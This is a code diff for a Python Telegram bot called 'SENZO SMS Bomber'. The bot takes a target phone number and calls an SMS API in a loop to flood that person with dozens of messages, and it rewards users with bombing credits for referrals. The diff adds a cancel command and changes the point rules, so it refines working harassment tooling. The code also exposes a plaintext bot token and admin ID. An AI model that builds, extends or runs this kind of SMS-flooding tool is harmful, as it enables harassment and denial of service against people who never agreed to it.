@@ -9,8 +9,8 @@ from datetime import datetime
 import random
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8756569061:AAERAjWFm82B5l3LYNTFEYAJqWfNwQy22os"
-ADMIN_CHAT_ID = "6070145287"
+BOT_TOKEN = "8756569061:AAERAjWFm82B5l3LYNTFEYAJqWfNwQy22os"  # Leave space for your bot token
+ADMIN_CHAT_ID = "6070145287"  # Leave space for admin chat ID
 
 # Channel links
 TELEGRAM_CHANNEL = "https://t.me/+wRaWDUT9DB41ZWE0"
@@ -25,6 +25,9 @@ USER_DATA_FILE = "user_data.json"
 
 # Initialize bot
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# Dictionary to track active bombing sessions for cancellation
+active_bombings = {}
 
 # Load user data
 def load_user_data():
@@ -60,51 +63,120 @@ def update_referral_points(user_id, referred_by=None):
     if referred_by and referred_by != str(user_id):
         if referred_by in user_data:
             user_data[referred_by]["referral_points"] += 1
-            bot.send_message(referred_by, f"🎉 Great! Someone joined using your referral link!\n✨ You earned 1 referral point!\n💥 Now you can send 5 more SMS bombs!")
+            bot.send_message(referred_by, f"🎉 Great! Someone joined using your referral link!\n✨ You earned 1 referral point!\n💥 Now you can send 1 SMS bomb!")
     
     save_user_data(user_data)
 
-# SMS bombing function with loading bar
-def send_sms_bomb(chat_id, phone_number, user_id):
+# SMS bombing function with loading bar and cancel support (points deducted on start)
+def send_sms_bomb(chat_id, phone_number, user_id, message_id):
+    # Create a unique session ID for this bombing
+    session_id = f"{chat_id}_{user_id}_{int(time.time())}"
+    active_bombings[session_id] = {"active": True, "chat_id": chat_id, "user_id": user_id}
+    
     # Check if user has enough points
     if str(user_id) in user_data:
         if user_data[str(user_id)].get("referral_points", 0) < 1:
             bot.send_message(chat_id, "❌ You don't have enough referral points!\n💡 Get referral points by inviting friends!\n🔗 Use /referral to get your link.")
+            del active_bombings[session_id]
             return
     
-    msg = bot.send_message(chat_id, f"📱 **SMS Bomber Active**\nTarget: `{phone_number}`\n\n[░░░░░░░░░░] 0%", parse_mode="Markdown")
-    
-    # Simulate loading bar
-    for i in range(1, 11):
-        time.sleep(0.3)
-        progress = i * 10
-        bar = "█" * i + "░" * (10 - i)
-        bot.edit_message_text(
-            f"📱 **SMS Bomber Active**\nTarget: `{phone_number}`\n\n[{bar}] {progress}%\n🚀 Sending SMS...",
-            chat_id, msg.message_id, parse_mode="Markdown"
-        )
-        
-        # Send actual SMS bomb requests
-        for _ in range(5):
-            try:
-                response = requests.get(f"{SMS_API_URL}?number={phone_number}", timeout=5)
-                if response.status_code == 200:
-                    continue
-            except:
-                pass
-    
-    # Deduct referral points
+    # DEDUCT POINT IMMEDIATELY WHEN BOMBING STARTS
     if str(user_id) in user_data:
-        user_data[str(user_id)]["referral_points"] -= 1
-        user_data[str(user_id)]["total_bombs"] += 1
-        save_user_data(user_data)
+        if user_data[str(user_id)].get("referral_points", 0) >= 1:
+            user_data[str(user_id)]["referral_points"] -= 1
+            user_data[str(user_id)]["total_bombs"] += 1
+            save_user_data(user_data)
     
-    bot.edit_message_text(
-        f"✅ **SMS Bombing Complete!**\n📱 Target: `{phone_number}`\n💥 Status: Success\n\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
-        chat_id, msg.message_id, parse_mode="Markdown"
-    )
+    try:
+        # Simulate loading bar with cancel check
+        for i in range(1, 11):
+            # Check if bombing was cancelled
+            if not active_bombings.get(session_id, {}).get("active", True):
+                # Point already deducted, so just show cancellation message
+                bot.edit_message_text(
+                    f"❌ **SMS Bombing Cancelled!**\n📱 Target: `{phone_number}`\n\n⏹️ You stopped the bombing process.\n💥 **1 Point has been deducted** (used for this bombing)\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
+                    chat_id, message_id, parse_mode="Markdown"
+                )
+                del active_bombings[session_id]
+                return
+            
+            progress = i * 10
+            bar = "█" * i + "░" * (10 - i)
+            bot.edit_message_text(
+                f"📱 **SMS Bomber Active**\nTarget: `{phone_number}`\n\n[{bar}] {progress}%\n🚀 Sending SMS...\n\n⚡ Type /cancel to stop (point will still be deducted)",
+                chat_id, message_id, parse_mode="Markdown"
+            )
+            
+            # Send actual SMS bomb requests
+            for _ in range(5):
+                # Check for cancellation during API calls
+                if not active_bombings.get(session_id, {}).get("active", True):
+                    break
+                try:
+                    response = requests.get(f"{SMS_API_URL}?number={phone_number}", timeout=5)
+                    if response.status_code == 200:
+                        continue
+                except:
+                    pass
+            time.sleep(0.3)
+        
+        # Check one more time before completing
+        if active_bombings.get(session_id, {}).get("active", True):
+            bot.edit_message_text(
+                f"✅ **SMS Bombing Complete!**\n📱 Target: `{phone_number}`\n💥 Status: Success\n\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
+                chat_id, message_id, parse_mode="Markdown"
+            )
+        else:
+            # If cancelled after point deduction
+            bot.edit_message_text(
+                f"❌ **SMS Bombing Cancelled!**\n📱 Target: `{phone_number}`\n\n⏹️ You stopped the bombing process.\n💥 **1 Point has been deducted** (used for this bombing)\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
+                chat_id, message_id, parse_mode="Markdown"
+            )
+        
+        # Clean up
+        if session_id in active_bombings:
+            del active_bombings[session_id]
+            
+    except Exception as e:
+        if session_id in active_bombings:
+            del active_bombings[session_id]
+        bot.send_message(chat_id, f"❌ Error occurred during bombing!\n💥 **Point has been deducted** (bombing failed)\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}")
 
-# ========== COMMAND HANDLERS ==========
+# Cancel command - Stops active bombing (point already deducted)
+@bot.message_handler(commands=['cancel'])
+def cancel_command(message):
+    user_id = str(message.from_user.id)
+    chat_id = message.chat.id
+    
+    # Find and cancel active bombing for this user
+    cancelled = False
+    for session_id, session in active_bombings.items():
+        if session["user_id"] == user_id and session["active"]:
+            session["active"] = False
+            cancelled = True
+            break
+    
+    if cancelled:
+        # Get current points
+        current_points = user_data.get(user_id, {}).get("referral_points", 0)
+        bot.send_message(
+            chat_id,
+            f"⏹️ **Bombing Cancelled!**\n\n"
+            f"Your SMS bombing has been stopped.\n"
+            f"💥 **1 Point has been deducted** for this bombing attempt.\n"
+            f"💎 **Remaining Points:** {current_points}\n\n"
+            f"Use /start to go back to main menu.",
+            parse_mode="Markdown"
+        )
+    else:
+        bot.send_message(
+            chat_id,
+            f"❌ **No Active Bombing Found**\n\n"
+            f"You don't have any active SMS bombing to cancel.\n"
+            f"Use /start to begin a new session.\n\n"
+            f"💡 **Note:** Points are deducted when bombing starts, not when cancelled.",
+            parse_mode="Markdown"
+        )
 
 # Start command
 @bot.message_handler(commands=['start'])
@@ -143,22 +215,15 @@ def start_command(message):
         f"💣 Total Bombs: {user_data[user_id].get('total_bombs', 0)}\n\n"
         f"⚡ **Features:**\n"
         f"• Professional SMS Bomber\n"
-        f"• Channel Verification\n\n"
-        f"⚠️ **Warning:** Use responsibly!\n\n"
+        f"• Channel Verification\n"
+        f"• Cancel anytime with /cancel\n\n"
+        f"⚠️ **Important:**\n"
+        f"• 1 Point = 1 SMS Bomb (50+ SMS)\n"
+        f"• **Point deducted immediately when bombing starts**\n"
+        f"• Cancelling will NOT refund the point\n\n"
         f"📚 Type /help for commands",
         parse_mode="Markdown",
         reply_markup=markup
-    )
-
-# Cancel command
-@bot.message_handler(commands=['cancel'])
-def cancel_command(message):
-    bot.send_message(
-        message.chat.id,
-        "❌ **Operation Cancelled**\n\n"
-        "You have cancelled the current operation.\n"
-        "Use /start to go back to main menu.",
-        parse_mode="Markdown"
     )
 
 # Referral command
@@ -180,7 +245,7 @@ def referral_command(message):
         message.chat.id,
         f"👥 **REFERRAL SYSTEM** 👥\n\n"
         f"💎 Your Points: **{points}**\n"
-        f"💣 1 Point = 5 SMS Bombs\n\n"
+        f"💣 1 Point = 1 SMS Bomb (50+ SMS)\n\n"
         f"🔗 **Your Referral Link:**\n`{referral_link}`\n\n"
         f"📊 **How it Works:**\n"
         f"• Share your link with friends\n"
@@ -208,7 +273,7 @@ def points_command(message):
         f"💎 **Your Stats** 💎\n\n"
         f"Points: `{points}`\n"
         f"Total Bombs Sent: `{bombs}`\n"
-        f"Available Bombs: `{points * 5}`\n\n"
+        f"Available Bombs: `{points}`\n\n"
         f"Use /referral to get your invite link!",
         parse_mode="Markdown"
     )
@@ -222,18 +287,24 @@ def help_command(message):
         f"/start - Open main menu\n"
         f"/referral - Get your referral link\n"
         f"/points - Check your points and stats\n"
-        f"/cancel - Cancel current operation\n"
+        f"/cancel - Stop active SMS bombing\n"
         f"/help - Show this help message\n\n"
         f"🔧 **How to use:**\n"
         f"1. Click START BOMBER\n"
         f"2. Join required channels\n"
         f"3. Enter phone number\n"
-        f"4. Watch the magic happen!\n\n"
+        f"4. Watch the magic happen!\n"
+        f"5. Type /cancel to stop anytime\n\n"
+        f"💰 **Points System:**\n"
+        f"• 1 Point = 1 SMS Bomb (50+ SMS)\n"
+        f"• **Point deducted IMMEDIATELY when bombing starts**\n"
+        f"• Cancelling does NOT refund points\n"
+        f"• Get points by sharing your referral link\n\n"
         f"💡 Need points? Share your referral link!",
         parse_mode="Markdown"
     )
 
-# ========== CALLBACK HANDLERS ==========
+# Callback handlers
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     user_id = str(call.from_user.id)
@@ -265,7 +336,11 @@ def callback_handler(call):
             "📱 **Enter Phone Number**\n\n"
             "Format: `923xxxxxxxxxx`\n"
             "Example: `923001234567`\n\n"
-            "Type /cancel to cancel.", 
+            "⚠️ **IMPORTANT:**\n"
+            "• 1 Point will be deducted immediately\n"
+            "• Cancelling with /cancel will NOT refund\n"
+            "• Make sure number is correct!\n\n"
+            "Type /cancel to abort.", 
             parse_mode="Markdown"
         )
         bot.register_next_step_handler(msg, process_phone_number, call.from_user.id)
@@ -282,7 +357,7 @@ def callback_handler(call):
         bot.edit_message_text(
             f"👥 **REFERRAL SYSTEM** 👥\n\n"
             f"💎 Your Points: **{points}**\n"
-            f"💣 1 Point = 5 SMS Bombs\n\n"
+            f"💣 1 Point = 1 SMS Bomb (50+ SMS)\n\n"
             f"🔗 **Your Referral Link:**\n`{referral_link}`\n\n"
             f"📊 **How it Works:**\n"
             f"• Share your link with friends\n"
@@ -372,7 +447,7 @@ def callback_handler(call):
     elif call.data == "back_main":
         start_command(call.message)
 
-# ========== HELPER FUNCTIONS ==========
+# Helper functions
 def process_phone_number(message, user_id):
     if message.text == "/cancel":
         bot.send_message(
@@ -398,8 +473,16 @@ def process_phone_number(message, user_id):
         )
         return
     
-    # Start bombing in a new thread
-    thread = threading.Thread(target=send_sms_bomb, args=(message.chat.id, phone_number, user_id))
+    # Send initial message and get its ID for updates
+    msg = bot.send_message(
+        message.chat.id,
+        f"📱 **Starting SMS Bomber...**\nTarget: `{phone_number}`\n\n**1 Point has been deducted**\nPlease wait...",
+        parse_mode="Markdown"
+    )
+    
+    # Start bombing in a new thread with message_id
+    thread = threading.Thread(target=send_sms_bomb, args=(message.chat.id, phone_number, user_id, msg.message_id))
+    thread.daemon = True
     thread.start()
 
 def admin_add_points_handler(message):
@@ -465,10 +548,11 @@ def admin_broadcast_handler(message):
 def handle_unknown(message):
     bot.send_message(message.chat.id, "❌ Unknown command. Use /start to begin or /help for commands.")
 
-# ========== RUN BOT ==========
+# Run bot
 if __name__ == "__main__":
     print("🤖 SENZO SMS Bomber Bot Started!")
     print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
     print("✅ Bot is running...")
     print("📚 Commands available: /start, /referral, /points, /cancel, /help")
+    print("💡 /cancel will stop bombing but point will NOT be refunded!")
     bot.infinity_polling()
